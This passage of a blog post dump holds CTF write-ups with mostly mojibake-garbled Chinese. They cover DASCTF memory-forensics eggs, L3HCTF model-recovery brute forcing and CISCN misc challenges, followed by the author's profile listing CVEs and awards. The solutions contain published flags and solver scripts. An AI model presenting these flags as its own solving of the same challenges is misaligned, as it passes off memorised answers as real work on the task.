in range(0, len(data)): fs.write(struct.pack(\u0026#39;B\u0026#39;, data[i] ^ list1[i % a*b*6])) # data = fs.read() # for i in range(0, len(data)): # fp.write(struct.pack(\u0026#39;B\u0026#39;, data[i] ^ list1[i % a*b*6])) fp.close() fs.close() ç›´æ¥stegsolveçœ‹Frame10å¾—åˆ°flag\n1 DASCTF{c3837c61-77f1-413e-b2e6-3ccbc96df9f4} å½©è›‹éƒ¨åˆ†\n1ï¼šæ¡Œé¢æœ‰ä¸ªæ–°å»ºæ–‡æœ¬æ–‡æ¡£.txté‡Œé¢æ˜¯egg1\n1 0x000000003e20d900 1 0 R--r-- \\Device\\HarddiskVolume2\\Users\\Yusa\\Desktop\\æ–°å»ºæ–‡æœ¬æ–‡æ¡£.txt 2ï¼šfiledumpså¾—åˆ°egg2ï¼Œé‡Œé¢å†…å®¹å°±æ˜¯å½©è›‹\n1 0x000000003f82fdc0 1 0 R--r-- \\Device\\HarddiskVolume2\\Program Files\\Reference Assemblies\\Microsoft\\Framework\\egg2 3ï¼šYusa.contactçš„ç½‘ç«™éƒ¨åˆ†\n1 egg3 You still have lots more to work on... 4ï¼šcmdscanå¾—åˆ°egg4\n1 2 egg4 eXVzYeWnkOWnkOacieWlveWkmuWlveWkmueahOWwj+Woh+Wmu++8jOa4o+eUtw== # baseè§£å¯†å¾—åˆ°ï¼šyusaå§å§æœ‰å¥½å¤šå¥½å¤šçš„å°å¨‡å¦»ï¼Œæ¸£ç”· 5ï¼šscreenshot å¾—åˆ°th1s_1s_3gg5_k3y\nç”¨ä¸Šé¢çš„å¯†é’¥ä¸‹é¢æ–‡ä»¶å¾—åˆ°egg5\n1 0x000000003f2ae290 1 0 R--r-- \\Device\\HarddiskVolume2\\Users\\Yusa\\Desktop\\Sakuraæ–‡ä»¶\\Sakura-egg5 2021L3HCTF DeepDarkFantasy å®‰è£…torch åˆšå¥½æœ‰CUDA å°±æƒ³ç€è·Ÿç€å¤ç°ä¸€é\npthæ˜¯torchæ¨¡å‹æ–‡ä»¶ xoråè·å¾—æ­£ç¡®çš„æ¨¡å‹\nå®˜ç½‘ä¸€æ¡å‘½ä»¤å®‰è£…torch\n1 pip3 install torch==1.10.0+cu102 torchvision==0.11.1+cu102 torchaudio===0.10.0+cu102 -f https://download.pytorch.org/whl/cu102/torch_stable.html å‰ç½®çŸ¥è¯† torchæœ‰ä¸¤ç§æ¨¡å‹ä¿å­˜æ–¹æ³•\nä¿å­˜æ•´ä¸ªç¥ç»ç½‘ç»œçš„ç»“æ„ä¿¡æ¯å’Œæ¨¡å‹çš„å‚æ•°ä¿¡æ¯ saveå¯¹è±¡æ˜¯ç½‘ç»œnet è¯¥æ–¹æ³•ä¿å­˜çš„æ¨¡å‹é€šè¿‡torch.load()ç›´æ¥åˆå§‹åŒ–æ–°çš„ç¥ç»ç½‘ç»œ\n1 2 3 4 #ä¿å­˜æ¨¡å‹ torch.save(model_object,\u0026#39;resnet.pth\u0026#39;) #åŠ è½½æ¨¡å‹ model=torch.load(\u0026#39;resnet.pth\u0026#39;) åªä¿å­˜ç¥ç»ç½‘ç»œçš„è®­ç»ƒæ¨¡å‹å‚æ•° saveå¯¹è±¡æ˜¯net.state_dict() è¯¥æ–¹æ³•ä¿å­˜çš„æ–¹å¼ï¼šé¦–å…ˆå¯¼å…¥å¯¹åº”çš„ç½‘ç»œ å†net.load_state_dict()å®Œæˆæ¨¡å‹å‚æ•°çš„åŠ è½½\n1 2 3 4 5 #å°†my_resnetæ¨¡å‹å­˜å‚¨ä¸ºmy_resnet.pth torch.save(my_resnet.state_dict(),\u0026#34;my_resnet.pth\u0026#34;) #åŠ è½½resnetï¼Œæ¨¡å‹å­˜æ”¾åœ¨my_resnet.pth my_resnet.load_state_dict(torch.load(\u0026#34;my_resnet.pth\u0026#34;)) #å…¶ä¸­my_resnetæ˜¯my_resnet.pthå¯¹åº”çš„ç½‘ç»œç»“æ„ï¼› å¤ç°è¿‡ç¨‹ 0x01 å…ˆç¡®å®šä¿å­˜æ¨¡å‹çš„æ–¹æ³• load(model)æŠ¥é”™ååºåˆ—åŒ–find_classå‡ºé”™ï¼Œè¿™ä¸ªMyAutoEncoderå°±æ˜¯ä»–å®šä¹‰çš„ç±»ã€‚\né‚£ä¹ˆå°±éœ€è¦æˆ‘ä»¬æ‰‹åŠ¨æ„å»ºç½‘ç»œç„¶åå¯¼å…¥\næ‰‹åŠ¨å®šä¹‰ä¸€ä¸ªåŒåç±»åå®ä¾‹åŒ–loadæç¤ºç¼ºå°‘Encoder\u0026amp;Decoder\nç¼–å†™ä¸‰ä¸ªç©ºç±»åå¯ä»¥æˆåŠŸload çœ‹åˆ°ä¿å­˜çš„ç½‘ç»œç»“æ„å’Œè®­ç»ƒå¥½çš„å‚æ•°\nè‡³æ­¤æˆ‘ä»¬å¯ä»¥ç¡®å®šä¿å­˜çš„æ˜¯ç¬¬ä¸€ç§ç±»å‹ å³æ—¢ä¿å­˜ç½‘è·¯æ¨¡å‹åˆä¿å­˜è®­ç»ƒå‚æ•°\n0x02 æ¢å¤ç½‘ç»œç»“æ„ ä¸Šé¢è¯´åˆ°æˆåŠŸload model\nå› ä¸ºstate_dictæ˜¯å…·ä½“å‚æ•°æˆ‘ä»¬å¯ä»¥æš‚æ—¶ä¸ç®¡ ç›´æ¥print modelæŸ¥çœ‹ç½‘ç»œç»“æ„\n1 print(ruokeqxmodel[\u0026#39;model\u0026#39;]) 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 36 MyAutoEncoder( (encoder): Encoder( (conv): Sequential( (0): Conv2d(1, 16, kernel_size=(3, 3), stride=(2, 2), padding=(1, 1)) (1): ReLU() (2): MaxPool2d(kernel_size=2, stride=2, padding=0, dilation=1, ceil_mode=False) (3): Conv2d(16, 8, kernel_size=(3, 3), stride=(2, 2), padding=(1, 1)) (4): MaxPool2d(kernel_size=2, stride=2, padding=0, dilation=1, ceil_mode=False) (5): ReLU() (6): Conv2d(8, 8, kernel_size=(3, 3), stride=(2, 2), padding=(1, 1)) (7): MaxPool2d(kernel_size=2, stride=2, padding=1, dilation=1, ceil_mode=False) (8): ReLU() (9): MaxPool2d(kernel_size=2, stride=2, padding=0, dilation=1, ceil_mode=False) (10): Flatten(start_dim=1, end_dim=-1) ) (fc): Linear(in_features=32, out_features=16, bias=True) ) (decoder): Decoder( (convt): Sequential( (0): ConvTranspose2d(1, 256, kernel_size=(1, 1), stride=(1, 1)) (1): ReLU() (2): ConvTranspose2d(256, 256, kernel_size=(1, 1), stride=(1, 1)) (3): ReLU() (4): ConvTranspose2d(256, 512, kernel_size=(1, 1), stride=(1, 1)) (5): ReLU() (6): ConvTranspose2d(512, 128, kernel_size=(4, 4), stride=(4, 4)) (7): ReLU() (8): ConvTranspose2d(128, 64, kernel_size=(4, 4), stride=(4, 4)) (9): ReLU() (10): ConvTranspose2d(64, 32, kernel_size=(2, 2), stride=(2, 2)) (11): ReLU() (12): ConvTranspose2d(32, 1, kernel_size=(2, 2), stride=(2, 2)) (13): Sigmoid() ) ) ) æ¥ä¸‹æ¥ç…§æŠ„æ¢å¤ç½‘ç»œç»“æ„\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 36 37 38 39 40 41 42 43 44 45 46 47 48 49 50 51 52 53 54 55 56 57 58 59 class Encoder(Module): def __init__(self): super().__init__() self.conv = Sequential( Conv2d(1, 16, kernel_size=(3, 3), stride=(2, 2), padding=(1, 1)), ReLU(), MaxPool2d(kernel_size=2, stride=2, padding=0, dilation=1, ceil_mode=False), Conv2d(16, 8, kernel_size=(3, 3), stride=(2, 2), padding=(1, 1)), MaxPool2d(kernel_size=2, stride=2, padding=0, dilation=1, ceil_mode=False), ReLU(), Conv2d(8, 8, kernel_size=(3, 3), stride=(2, 2), padding=(1, 1)), MaxPool2d(kernel_size=2, stride=2, padding=1, dilation=1, ceil_mode=False), ReLU(), MaxPool2d(kernel_size=2, stride=2, padding=0, dilation=1, ceil_mode=False), Flatten(start_dim=1, end_dim=-1) ) self.fc = Linear(in_features=32, out_features=16, bias=True) def forward(self, t): t = self.conv(t) t = self.fc(t) return t class Decoder(Module): def __init__(self): super().__init__() self.convt = Sequential( ConvTranspose2d(1, 256, kernel_size=(1, 1), stride=(1, 1)), ReLU(), ConvTranspose2d(256, 256, kernel_size=(1, 1), stride=(1, 1)), ReLU(), ConvTranspose2d(256, 512, kernel_size=(1, 1), stride=(1, 1)), ReLU(), ConvTranspose2d(512, 128, kernel_size=(4, 4), stride=(4, 4)), ReLU(), ConvTranspose2d(128, 64, kernel_size=(4, 4), stride=(4, 4)), ReLU(), ConvTranspose2d(64, 32, kernel_size=(2, 2), stride=(2, 2)), ReLU(), ConvTranspose2d(32, 1, kernel_size=(2, 2), stride=(2, 2)), Sigmoid() ) def forward(self, t): t = self.convt(t) return t class MyAutoEncoder(Module): def __init__(self): super().__init__() # self.encoder = Encoder() # self.decoder = Decoder() def forward(self, t): t = self.encoder.forward(t) t = self.decoder.forward(t) return t å†æ¥ä¸‹æ¥æˆ‘ä»¬å¯ä»¥å®ä¾‹åŒ–ä¸€ä¸ªè‡ªå·±çš„ç½‘ç»œç„¶åç”¨load_state_dict æŠŠåˆšæ‰è¯´çš„modelé‡Œè®­ç»ƒå¥½çš„å‚æ•°è¯»å‡ºæ¥\n0x03 fuzz and solve å¯¼å…¥å‚æ•°åï¼Œéšä¾¿è¾“å…¥ä¸€ä¸ªå¼ é‡decode\nConv2dè¾“å…¥å‚æ•°ä¸ºå››ç»´æ•°æ®ï¼Œå¦‚æœä¸æ˜¯4ç»´çš„ä¼šæŠ¥é”™æç¤ºè¦è¾“å…¥4-dimensional\nç”Ÿæˆä¸€ä¸ªéšæœºçš„å››ç»´å¼ é‡è¾“å…¥ å¯ä»¥çœ‹åˆ°è¾“å‡ºéšçº¦æœ‰L3å­—æ ·\n1 2 3 4 5 6 toPIL = transforms.ToPILImage() data = torch.randn(1, 1, 1, 1) print(data) # tensor([[[[1.7006]]]]) pics = ruokeqxmodel.forward(data)[0] pic = toPIL(pics) pic.save(\u0026#39;./flag.jpg\u0026#39;) å†ç”Ÿæˆä¸€ä¸ªå››ç»´[1,1,4,4]16ä¸ªéšæœºæ•°ï¼Œå¯ä»¥çœ‹åˆ°ä¸åŒéšæœºæ•°ä¸‹è¾“å‡ºä¸åŒå­—æ ·ï¼Œçˆ†ç ´å³å¯\nç”Ÿæˆæ­£è´Ÿ20ä¸ªæ•° å‘ç°æ­£çš„éƒ¨åˆ†åˆ°12å°±ä¸å˜ç„¶åå¾ˆæ¸…æ™° è´Ÿçš„åˆ°19è¿˜ä¸æ˜¯å¾ˆæ¸…æ™°\nè®¾ç½®offset -5 ç„¶åç”Ÿæˆæ•°å¢åŠ åˆ°æ­£è´Ÿ30\nå¯ä»¥çœ‹åˆ°åˆ°-22åŸºæœ¬ä¸å˜ï¼Œ+14åŸºæœ¬ä¸å˜ï¼Œæœ€ç»ˆoffsetå°±å®š-4ï¼Œstep1å¤ªå¤§äº†ï¼Œæ‰€ä»¥step0.1ï¼Œrange180\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 modelname = \u0026#34;./decrypted.pth\u0026#34; ruokeqxmodel = MyAutoEncoder() ruokeqxmodel.load_state_dict(torch.load(modelname)[\u0026#39;state_dict\u0026#39;]) offset = -4 for i in range(180): trans = transforms.ToPILImage() pl = [[[[offset + 0.1 * i]]]] nl = [[[[offset - 0.1 * i]]]] pdata = torch.tensor(pl) ndata = torch.tensor(nl) ppic = ruokeqxmodel.forward(pdata)[0] npic = ruokeqxmodel.forward(ndata)[0] pic = toPIL(ppic[0]) pic.save(\u0026#39;./flag/flag\u0026#39; + str(10*offset + i) + \u0026#39;.png\u0026#39;) pic = trans(npic[0]) pic.save(\u0026#39;./flag/flag\u0026#39; + str(10*offset - i) + \u0026#39;.png\u0026#39;) æ‹¼å›¾å¾—åˆ°flag\n1 L3HCTF{blackbinarysencoder0xb1a876a} 2021CISCNåˆèµ› ç¨å¾®åšäº†ä¸€ç‚¹misc å¸¦èººè¿˜å¾—çœ‹é˜Ÿå‹\ntiny traffic httpçœ‹åˆ°getäº†flagç›¸å…³ä¸œè¥¿\nflag_wrapper gzipè§£å¯†å¾—åˆ°flagå¤´ CISCN{}\npython brè§£å¯†testå¾—åˆ°proto\nsyntax = \u0026#34;proto3\u0026#34;;\rmessage PBResponse {\rint32 code = 1;\rint64 flag_part_convert_to_hex_plz = 2;\rmessage data {\rstring junk_data = 2;\rstring flag_part = 1;\r}\rrepeated data dataList = 3;\rint32 flag_part_plz_convert_to_hex = 4;\rstring flag_last_part = 5;\r}\rmessage PBRequest {\rstring cate_id = 1;\rint32 page = 2;\rint32 pageSize = 3;\r} https://www.buymeacoffee.com/marcgravell\nç”¨ä»–çš„åœ¨çº¿å·¥å…·ç”Ÿæˆpy(å¥½åƒæ˜¯è¿™ä¸ªçš„ä½œè€…)\n1 2 # æ‰“å°ä¸€ä¸‹å¾—åˆ°flag hex(proto.flag_part_convert_to_hex_plz)[2:] + proto.dataList[0].flag_part + proto.dataList[1].flag_part + hex(proto.flag_part_plz_convert_to_hex)[2:] + proto.flag_last_part running_pixel æŠ½å¸§çœ‹äº†ä¸€çœ¼å¤§æ¦‚æ˜¯æ¯åå¸§ä¸€é‡å¤ çœ‹äº†ä¸€çœ¼åƒç´ æ¯å¼ ä¸¤ä¸ªåƒç´ ä¸ä¸€æ · å¾ªç¯è¾“å‡ºç‚¹å‘ç°ä½ç½®ä¸ä¸€æ ·ä½†å¾ˆè¿‘ ç”»å‡ºæ¥çœ‹äº†ä¸€çœ¼æ˜¯å­—ç¬¦ é‚£å°±å…¨ç”»å‡ºæ¥å°±æ˜¯flagäº†\n1 2 3 4 5 6 7 8 9 10 from PIL import Image flag=[(231, 114), (325, 171), (231, 115), (326, 171), (231, 116), (327, 171), (232, 114), (328, 171), (233, 114), (329, 171), (233, 115), (229, 114), (233, 116), (229, 115), (36, 242), (229, 116), (36, 243), (230, 116), (36, 244), (231, 114), (37, 242), (231, 115), (38, 242), (231, 116), (38, 243), (232, 114), (38, 244), (233, 114), (39, 244), (233, 115), (40, 242), (233, 116), (40, 243), (36, 242), (40, 244), (36, 243), (36, 244), (306, 256), (37, 242), (306, 257), (38, 242), (306, 258), (38, 243), (307, 256), (38, 244), (307, 258), (39, 244), (308, 256), (40, 242), (308, 258), (40, 243), (309, 256), (40, 244), (309, 258), (310, 256), (306, 256), (310, 257), (306, 257), (310, 258), (306, 258), (307, 256), (359, 145), (307, 258), (359, 147), (308, 256), (360, 145), (308, 258), (360, 147), (309, 256), (361, 145), (309, 258), (361, 146), (310, 256), (361, 147), (310, 257), (362, 147), (310, 258), (363, 147), (152, 101), (359, 145), (152, 102), (359, 147), (153, 101), (360, 145), (153, 103), (360, 147), (154, 101), (361, 145), (154, 103), (361, 146), (155, 101), (361, 147), (155, 103), (362, 147), (156, 101), (363, 147), (156, 102), (152, 101), (152, 102), (360, 225), (153, 101), (360, 226), (153, 103), (360, 227), (154, 101), (361, 225), (154, 103), (361, 227), (155, 101), (362, 225), (155, 103), (362, 227), (156, 101), (363, 225), (156, 102), (363, 227), (364, 225), (360, 225), (364, 226), (360, 226), (364, 227), (360, 227), (235, 383), (361, 225), (235, 384), (361, 227), (235, 385), (362, 225), (236, 383), (362, 227), (237, 383), (363, 225), (237, 384), (363, 227), (237, 385), (364, 225), (238, 383), (364, 226), (239, 383), (364, 227), (32, 197), (235, 383), (32, 198), (235, 384), (32, 199), (235, 385), (236, 383), (237, 383), (278, 35), (237, 384), (278, 36), (237, 385), (278, 37), (238, 383), (279, 35), (239, 383), (279, 37), (280, 35), (32, 197), (280, 36), (32, 198), (280, 37), (32, 199), (281, 37), (282, 35), (278, 35), (282, 36), (278, 36), (282, 37), (278, 37), (174, 295), (279, 35), (174, 296), (279, 37), (175, 295), (280, 35), (175, 297), (280, 36), (176, 295), (280, 37), (176, 297), (281, 37), (177, 295), (282, 35), (177, 297), (282, 36), (178, 295), (282, 37), (178, 296), (174, 295), (167, 231), (174, 296), (167, 232), (175, 295), (167, 233), (175, 297), (168, 231), (176, 295), (169, 231), (176, 297), (169, 232), (177, 295), (169, 233), (177, 297), (170, 231), (178, 295), (171, 231), (178, 296), (171, 232), (167, 231), (171, 233), (167, 232), (167, 233), (249, 356), (168, 231), (250, 356), (169, 231), (251, 356), (169, 232), (252, 356), (169, 233), (253, 356), (170, 231), (171, 231), (342, 340), (171, 232), (342, 341), (171, 233), (342, 342), (243, 65), (249, 356), (243, 67), (250, 356), (244, 65), (251, 356), (244, 67), (252, 356), (245, 65), (253, 356), (245, 66), (245, 67), (342, 340), (246, 67), (342, 341), (247, 67), (342, 342), (117, 346), (243, 65), (117, 347), (243, 67), (118, 346), (244, 65), (118, 348), (244, 67), (119, 346), (245, 65), (119, 347), (245, 66), (120, 346), (245, 67), (120, 348), (246, 67), (121, 346), (247, 67), (121, 347), (117, 346), (67, 229), (117, 347), (67, 230), (118, 346), (67, 231), (118, 348), (68, 229), (119, 346), (68, 231), (119, 347), (69, 229), (120, 346), (69, 231), (120, 348), (70, 229), (121, 346), (70, 231), (121, 347), (71, 229), (67, 229), (71, 230), (67, 230), (71, 231), (67, 231), (39, 278), (68, 229), (39, 279), (68, 231), (39, 280), (69, 229), (40, 278), (69, 231), (40, 280), (70, 229), (41, 278), (70, 231), (41, 280), (71, 229), (42, 278), (71, 230), (42, 280), (71, 231), (43, 278), (39, 278), (43, 279), (39, 279), (43, 280), (39, 280), (40, 278), (279, 14), (40, 280), (279, 15), (41, 278), (279, 16), (41, 280), (42, 278), (264, 374), (42, 280), (264, 375), (43, 278), (264, 376), (43, 279), (265, 374), (43, 280), (265, 376), (266, 374), (266, 375), (279, 14), (266, 376), (279, 15), (267, 374), (279, 16), (267, 376), (264, 374), (268, 374), (264, 375), (268, 375), (264, 376), (268, 376), (265, 374), (70, 52), (265, 376), (70, 53), (266, 374), (70, 54), (266, 375), (71, 54), (266, 376), (72, 54), (267, 374), (73, 54), (267, 376), (74, 54), (268, 374), (268, 375), (228, 63), (268, 376), (229, 62), (70, 52), (229, 64), (70, 53), (230, 62), (70, 54), (230, 63), (71, 54), (230, 64), (72, 54), (231, 62), (73, 54), (231, 64), (74, 54), (232, 62), (232, 64), (228, 63), (229, 62), (321, 163), (229, 64), (321, 164), (230, 62), (321, 165), (230, 63), (322, 163), (230, 64), (323, 163), (231, 62), (323, 164), (231, 64), (323, 165), (232, 62), (324, 165), (232, 64), (325, 163), (325, 164), (321, 163), (325, 165), (321, 164), (289, 238), (321, 165), (289, 239), (322, 163), (289, 240), (323, 163), (323, 164), (161, 296), (323, 165), (162, 295), (324, 165), (162, 297), (325, 163), (163, 295), (325, 164), (163, 296), (325, 165), (163, 297), (164, 295), (289, 238), (164, 297), (289, 239), (165, 295), (289, 240), (165, 297), (161, 296), (72, 134), (162, 295), (72, 135), (162, 297), (72, 136), (163, 295), (73, 134), (163, 296), (74, 134), (163, 297), (74, 135), (164, 295), (74, 136), (164, 297), (75, 136), (165, 295), (76, 134), (165, 297), (76, 135), (72, 134), (76, 136), (72, 135), (72, 136), (165, 344), (73, 134), (165, 345), (74, 134), (165, 346), (74, 135), (166, 344), (74, 136), (167, 344), (75, 136), (167, 345), (76, 134), (167, 346), (76, 135), (168, 344), (76, 136), (169, 344), (165, 344), (310, 124), (165, 345), (310, 125), (165, 346), (311, 124), (166, 344), (311, 126), (167, 344), (312, 124), (167, 345), (312, 126), (167, 346), (313, 124), (168, 344), (313, 126), (169, 344), (314, 124), (314, 125), (310, 124), (310, 125), (357, 246), (311, 124), (357, 247), (311, 126), (358, 246), (312, 124), (358, 248), (312, 126), (359, 246), (313, 124), (359, 248), (313, 126), (360, 246), (314, 124), (360, 248), (314, 125), (361, 246), (361, 247), (357, 246), (14, 124), (357, 247), (14, 125), (358, 246), (14, 126), (358, 248), (15, 124), (359, 246), (15, 126), (359, 248), (16, 124), (360, 246), (16, 126), (360, 248), (17, 124), (361, 246), (17, 126), (361, 247), (18, 124), (14, 124), (18, 125), (14, 125), (18, 126), (14, 126), (15, 124), (386, 92), (15, 126), (386, 93), (16, 124), (386, 94), (16, 126), (387, 92), (17, 124), (387, 94), (17, 126), (388, 92), (18, 124), (388, 93), (18, 125), (388, 94), (18, 126), (389, 94), (390, 92), (386, 92), (390, 93), (386, 93), (390, 94), (386, 94), (315, 190), (387, 92), (315, 191), (387, 94), (315, 192), (388, 92), (316, 190), (388, 93), (316, 192), (388, 94), (317, 190), (389, 94), (317, 191), (390, 92), (317, 192), (390, 93), (318, 190), (390, 94), (318, 192), (315, 190), (319, 190), (315, 191), (319, 191), (315, 192), (319, 192), (316, 190), (231, 95), (316, 192), (231, 96), (317, 190), (231, 97), (317, 191), (232, 95), (317, 192), (233, 95), (318, 190), (233, 96), (318, 192), (233, 97), (319, 190), (234, 95), (319, 191), (234, 97), (319, 192), (235, 95), (231, 95), (235, 96), (231, 96), (235, 97), (231, 97), (232, 95), (337, 78), (233, 95), (338, 77), (233, 96), (338, 79), (233, 97), (339, 77), (234, 95), (339, 78), (234, 97), (339, 79), (235, 95), (340, 77), (235, 96), (340, 79), (235, 97), (341, 77), (341, 79), (337, 78), (338, 77), (379, 59), (338, 79), (379, 60), (339, 77), (379, 61), (339, 78), (380, 59), (339, 79), (380, 61), (340, 77), (381, 59), (340, 79), (381, 61), (341, 77), (382, 59), (341, 79), (382, 61), (383, 59), (379, 59), (383, 60), (379, 60), (383, 61), (379, 61), (122, 204), (380, 59), (122, 205), (380, 61), (122, 206), (381, 59), (123, 204), (381, 61), (123, 206), (382, 59), (124, 204), (382, 61), (124, 206), (383, 59), (125, 204), (383, 60), (125, 206), (383, 61), (126, 204), (122, 204), (126, 205), (122, 205), (126, 206), (122, 206)] pic = Image.new(\u0026#34;RGB\u0026#34;,(400,400)) i=0 for pix in flag: i=i+1 x=pix[1] y=pix[0] pic.putpixel((x,y),(255,255,255)) pic.save(f\u0026#39;{i:05d}.png\u0026#39;) éš”ç©ºä¼ è¯ æ‰¾åˆ°ä¸€ä¸ªåœ¨çº¿å·¥å…·\nhttps://tool.letmetellyou.xyz/pdu/\nç›´æ¥è§£ï¼Œç„¶ååˆå¹¶ä¸€ä¸‹ æœå¸¸è§æ–‡ä»¶å¤´çœ‹åˆ°8950 çœ‹åˆ°æ—¶é—´æˆ³æ˜¯ä¹±çš„ æƒ³åˆ°æ’åºåç»„åˆå›¾ç‰‡ä¸‡èƒ½excelæ’ä¸ªåº\nå†™ä¸ªè„šæœ¬æ¢å¤æ–‡ä»¶\n1 2 3 4 5 6 7 8 9 10 11 str = \u0026#34;\u0026#34; data = open(\u0026#39;data.txt\u0026#39;,\u0026#39;w\u0026#39;) with open(\u0026#39;op.csv\u0026#39;,\u0026#39;r\u0026#39;,newline=\u0026#39;\u0026#39;)as f: lines = f.readlines() for line in lines: temp = line.split(\u0026#39;,\u0026#39;)[1].split(\u0026#39;\\r\\n\u0026#39;)[0] # print(temp) str += temp data.write(str) data.close() åˆå¹¶ä¸€ä¸‹ç¬¬ä¸€éƒ¨åˆ†çš„æç¤ºå°±æ˜¯flag\nthe first part of the flag is the first 8 digits of your phone number\nDESTINATION ADDRESS: +8615030442000\nrobot æ ¹æ®é¢˜ç›®æè¿°çŒœæµ‹å¯èƒ½è·Ÿä½ç½®æˆ–è€…è·¯å¾„æœ‰å…³ï¼ŒæŸ¥çœ‹æµé‡æœposå¯ä»¥å‘ç°å¾ˆå¤šåæ ‡å¯¼å‡ºpos\n1 strings cap.pcapng | grep \u0026#34;Value\u0026#34; -A 1 | grep \u0026#34;\\[\u0026#34; | grep \u0026#34;\\]\u0026#34; \u0026gt; pos.txt å»æ‰äº†æ‹¬å· åˆšå¼€å§‹æƒ³ç”¨scatterç”»ä½†æ˜¯ä¸çŸ¥é“ä¸ºå•¥ç”»å‡ºæ¥å¾ˆå¥‡æ€ª æ¢æˆç”»å›¾ç‰‡å°±è¡Œäº†\n1 2 3 4 5 6 7 8 9 10 from PIL import Image from hashlib import md5 pic = Image.new(\u0026#34;RGB\u0026#34;,(400,400)) with open(\u0026#39;pos.txt\u0026#39;,\u0026#39;r\u0026#39;) as f: lines = f.readlines() for line in lines: pic.putpixel( (int(line.split(\u0026#39;,\u0026#39;)[0]),int(line.split(\u0026#39;,\u0026#39;)[1])) ,(255,255,255)) pic.show() pic.save(\u0026#39;./pic.png\u0026#39;) print(md5(b\u0026#39;easy_robo_xx\u0026#39;).hexdigest()) ","description":"","id":23,"section":"posts","tags":["CTF","WP"],"title":"2021CTF WP","uri":"https://ruokeqx.gitee.io/posts/2021wp/"},{"content":"Introduce ä¸€ä¸ªä»€ä¹ˆéƒ½ä¸ä¼šæ—¶å¸¸ç„¦è™‘å››å¤„ç¢°å£æœ‰æ‹–å»¶ç—‡çš„æ‡’ç‹—ä¸”å­¦ä¸åŠ¨äº†\nwhoami:ç‰Ÿè´¤é’\nid:è‹¥æ¸´\nwhy:å¾—ä»é«˜ä¸­çš„ç¬¬ä¸€å ‚è¯­æ–‡è¯¾è¯´èµ·ã€‚è¯­æ–‡è€å¸ˆè¯´å¤ä»£äººéƒ½æœ‰è‡ªå·±çš„å­—ï¼Œè€Œä¸”åäººçš„å­—å¾€å¾€éƒ½èµ·çš„å¾ˆæœ‰æ„ä¹‰ï¼Œé€šå¸¸æ˜¯ä¸è‡ªå·±çš„åæœ‰ç›¸åŒæˆ–ç›¸åçš„æ„æ€ï¼Œå¦‚ï¼šéŸ©æ„ˆï¼Œå­—é€€ä¹‹ï¼Œå› ä¸ºåå­—ä¸­æœ‰ä¸ªæ„ˆå­—ï¼Œèµ·åé€€ä¹‹å¸Œæœ›æ—¶åˆ»è­¦ç¤ºè‡ªå·±è¦è°¦é€Š(å¤§è‡´æ„æ€å¦‚æ­¤)ã€‚æˆ‘å½“å¹´é‚£ä¼šååˆ†ç››è¡Œâ€œè¦æ˜¯\u0026hellip;æˆ‘åå­—å°±å€’è¿‡æ¥å†™â€çš„å¥å¼ï¼Œè€Œæˆ‘çš„åå­—å€’è¿‡æ¥æ˜¯â€œé’è´¤â€ï¼Œè°éŸ³â€œæ±‚è´¤â€ï¼Œå› ä¸ºæœ‰ä¸ªæˆè¯­æ˜¯â€œæ±‚è´¤è‹¥æ¸´â€ï¼Œäºæ˜¯æˆ‘å–æˆè¯­ååŠéƒ¨åˆ†èµ·å­—â€œè‹¥æ¸´â€ï¼Œä¸ä»…æ˜¯å¸Œæœ›è‡ªå·±èƒ½å¤Ÿä¸æ›´å¤šçš„â€œè´¤äººâ€äº¤å¾€ï¼Œæ›´æ˜¯å¸Œæœ›è‡ªå·±èƒ½æ›´â€œè´¤â€ã€‚(PS:è¯­æ–‡è€å¸ˆä¹Ÿè¯´è¿™æ˜¯å…¨ç­èµ·çš„æœ€å¥½çš„å­—)\nTags Currently a student in ZSTU. A member of Nepnep. Really want a girl friend. Friends Qfrost-å®¢æˆ·ç«¯å®‰å…¨ã€é€†å‘\nriChar\u0026rsquo;s Blog-äºŒè¿›åˆ¶\nHn13-Webå®‰å…¨\nAwards Vul CVE Hertz v0.3.0 path traversal vulnerability via the normalizePath function. CVE-2022-40082 Labstack Echo v4.8.0 open redirect vulnerability via the Static Handler component. CVE-2022-40083 Game Name Time ğŸ¥‰\u0026quot;è½¯é“¶æœºå™¨äººæ¯\u0026quot;2019å¹´ä¸­å›½æœºå™¨äººæŠ€èƒ½å¤§èµ›ä¸‰ç­‰å¥– Nanjing,China,Dec,2019 ğŸ¥‰ä¸­å›½é«˜æ ¡è®¡ç®—æœºå¤§èµ›2020ç½‘ç»œæŠ€æœ¯æŒ‘æˆ˜èµ›åä¸œèµ›åŒºä¸‰ç­‰å¥– Online,Aug,2020 ğŸ†æµ™æ±Ÿçœç¬¬ä¸‰å±Šå¤§å­¦ç”Ÿç½‘ç»œä¸ä¿¡æ¯å®‰å…¨ç«èµ›å†³èµ›ä¸€ç­‰å¥– Zhejiang,China,Sep,2020 ğŸ†æµ™æ±Ÿçœç¬¬å››å±Šå¤§å­¦ç”Ÿç½‘ç»œä¸ä¿¡æ¯å®‰å…¨ç«èµ›å†³èµ›ä¸€ç­‰å¥– Zhejiang,China,Sep,2021 ğŸ†æµ™æ±Ÿçœç¬¬äº”å±Šå¤§å­¦ç”Ÿç½‘ç»œä¸ä¿¡æ¯å®‰å…¨ç«èµ›å†³èµ›ä¸€ç­‰å¥– Zhejiang,China,Sep,2022 ğŸ†ç¬¬åä¸‰å±Šå…¨å›½å¤§å­¦ç”Ÿä¿¡æ¯å®‰å…¨ç«èµ›â€”â€”åˆ›æ–°å®è·µèƒ½åŠ›èµ›åä¸œå—èµ›åŒºç‰¹ç­‰å¥– Online,Sep,2020 ğŸ¥‰ç¬¬åä¸‰å±Šå…¨å›½å¤§å­¦ç”Ÿä¿¡æ¯å®‰å…¨ç«èµ›â€”â€”åˆ›æ–°å®è·µèƒ½åŠ›èµ›æ€»å†³èµ›ä¸‰ç­‰å¥– Wuhan,China,Sep,2020 ğŸ¥‰ç¬¬å…­å±Šâ€œæ¹–æ¹˜æ¯â€ç½‘ç»œå®‰å…¨æŠ€èƒ½å¤§èµ›æ´åº­å†³èµ›åäºŒå Hunan,China,Nov,2020 ğŸ¥‰çº¢æ˜è°·æ¯æ•°æ®å®‰å…¨å¤§èµ›å†³èµ›ç¬¬åå››å(å¹¶åˆ—ç¬¬å) Sanming,China,Apr,2021 